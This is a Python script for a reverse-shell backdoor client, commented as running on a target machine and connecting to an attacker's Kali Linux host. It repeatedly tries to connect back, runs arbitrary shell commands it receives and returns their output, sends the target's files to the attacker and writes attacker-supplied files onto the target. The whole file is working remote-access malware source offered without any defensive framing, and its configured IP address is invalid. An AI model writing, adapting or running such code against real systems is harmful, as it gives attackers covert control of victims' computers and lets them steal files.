import socket       # For network communication
import json         # For serializing/deserializing data
import time         # For delays (e.g., reconnection attempts)
import subprocess   # For executing system commands
import os           # For file and directory operations

# Server configuration (attacker's machine)
SERVER_IP = '192.168.254.9849'  # IP of the Kali Linux machine (attacker)
SERVER_PORT = 5555            # Port to connect to

# Function to send data reliably over the socket in JSON format
def reliable_send(data):
    json_data = json.dumps(data)       # Convert data to JSON string
    target_sock.send(json_data.encode())  # Encode and send over socket

# Function to receive data reliably, handling partial packets
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data in chunks and decode
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)  # Parse JSON and return as Python object
        except ValueError:
            continue  # Incomplete data, keep receiving

# Establish and maintain connection to the server
def connection():
    while True:
        time.sleep(20)  # Wait 20 seconds before reconnecting (avoids flooding)
        try:
            # Attempt to connect to the server
            target_sock.connect((SERVER_IP, SERVER_PORT))
            shell()  # Start interactive shell upon successful connection
            target_sock.close()  # Close socket if shell() exits
            break  # Exit loop after disconnection
        except:
            connection()  # Retry on failure (recursive)

# Upload a file from the target machine to the attacker
def upload_file(filename):
    file = open(filename, 'rb')  # Open file in binary read mode
    target_sock.send(file.read())  # Send raw file data
    file.close()  # Close file after sending

# Download a file from the attacker to the target machine
def download_file(filename):
    file = open(filename, 'wb')  # Open file in binary write mode
    target_sock.settimeout(1)    # Set socket timeout for receiving chunks
    chunk = target_sock.recv(1024)  # Receive first chunk
    while chunk:  # While data is being received
        file.write(chunk)  # Write chunk to file
        try:
            chunk = target_sock.recv(1024)  # Receive next chunk
        except socket.timeout:  # Stop if timeout occurs (end of file)
            break
    target_sock.settimeout(None)  # Reset socket timeout
    file.close()  # Close file after writing

# Handle commands from the attacker
def shell():
    while True:
        command = reliable_recv()  # Receive command from attacker
        if command == 'quit':  # Exit shell loop
            break
        elif command == 'clear':  # No action (placeholder for clearing screen)
            pass
        elif command[:3] == 'cd ':  # Change directory
            os.chdir(command[3:])  # Execute cd command
        elif command[:9] == 'download ':  # Upload file to attacker
            upload_file(command[9:])  # Extract filename and upload
        elif command[:7] == 'upload ':  # Download file from attacker
            download_file(command[7:])  # Extract filename and download
        else:
            # Execute system command and capture output
            execute = subprocess.Popen(
                command,                   # Command to execute
                shell=True,                 # Run in shell
                stdout=subprocess.PIPE,     # Capture stdout
                stderr=subprocess.PIPE,     # Capture stderr
                stdin=subprocess.PIPE       # Pipe stdin (not used here)
            )
            # Combine stdout and stderr, decode bytes to string
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)  # Send result back to attacker

# Create a TCP/IP socket
target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Start the connection loop
connection()
